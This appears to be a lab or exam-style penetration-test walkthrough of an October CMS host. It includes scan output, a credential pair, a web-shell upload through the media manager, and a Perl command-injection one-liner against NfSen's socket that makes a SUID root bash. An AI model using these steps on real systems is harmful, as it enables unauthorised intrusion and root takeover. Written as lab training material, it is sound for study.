# 192.168.32.43

```
root@kali:/mnt/hgfs/Downloads# nmap -Pn -sV -sC 192.168.32.43
Starting Nmap 7.70 ( https://nmap.org ) at 2020-04-07 03:05 EDT
Nmap scan report for 192.168.32.43
Host is up (0.10s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 31:0c:c7:08:5b:f4:9e:f6:a1:bc:e8:6d:71:2a:d4:c5 (RSA)
|   256 25:4f:f9:a4:8f:5a:01:51:58:43:d2:73:f7:40:ef:0a (ECDSA)
|_  256 c2:10:82:c5:6c:86:94:b8:0a:97:6a:19:77:ec:09:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: october
MAC Address: 00:50:56:B8:84:03 (VMware)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.25 seconds
```


```
root@kali:/mnt/hgfs/Downloads# gobuster -u http://192.168.32.43 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.32.43/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 301,302,307,200,204
=====================================================
/javascript (Status: 301)
/october (Status: 301)
```

* October CMS

```
root@kali:~# gobuster -u http://192.168.32.43/october -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

Gobuster v1.4.1              OJ Reeves (@TheColonial)
=====================================================
=====================================================
[+] Mode         : dir
[+] Url/Domain   : http://192.168.32.43/october/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 200,204,301,302,307
=====================================================
/themes (Status: 301)
/modules (Status: 301)
/tests (Status: 301)
/storage (Status: 301)
/plugins (Status: 301)
/backend (Status: 302)
/vendor (Status: 301)
/config (Status: 301)
```


```
fyodor/picard
```


## Low Level Shell


http://192.168.32.43/october/backend/cms/media



http://192.168.32.43/october/storage/app/media/shell5.php


```
e47...
```


## Privesc



/data/nfsen/


```
/usr/bin/perl -e 'use Socket; socket(my $nfsend, AF_UNIX, SOCK_STREAM, 0); connect($nfsend, sockaddr_un("/data/nfsen/var/run/nfsen.comm")); print $nfsend "run-nfdump\nargs=-h \$(bash -c \"cp /bin/bash /tmp\")\n.\nrun-nfdump\nargs=-h \$(bash -c \"chmod u+s /tmp/bash\")\n.\n";'
```

```
www-data@october:/opt$ find / -iname "*nfsen.comm*" 2>/dev/null
/data/nfsen/var/run/nfsen.comm
```

```
www-data@october:/tmp$ ls -ll
total 2104
-rw-rw-rw- 1 www-data www-data   46631 Apr  7 03:22 LinEnum.sh
-rwsr-xr-x 1 root     www-data 1037528 Apr  7 03:36 bash
-rw-rw-rw- 1 www-data www-data  161298 Apr  7 03:22 linpeas.sh
-rw-rw-rw- 1 www-data www-data  805826 Apr  7 03:11 linpeas.txt
-rw-rw-rw- 1 www-data www-data   83454 Apr  7 03:22 linux-exploit-suggester.sh
drwx------ 2 www-data www-data    4096 Apr  7 03:05 tmux-33
drwx------ 2 root     root        4096 Apr  3  2019 vmware-root

```


```
www-data@october:/tmp$ ./bash -p
bash-4.3# id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=33(www-data)
bash-4.3# ls /root
proof.txt
bash-4.3# cat /root/proof.txt
4bc4....
bash-4.3#
bash-4.3# ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: ens160: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
    link/ether 00:50:56:b8:84:03 brd ff:ff:ff:ff:ff:ff
    inet 192.168.32.43/24 brd 192.168.32.255 scope global ens160
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feb8:8403/64 scope link
       valid_lft forever preferred_lft forever
```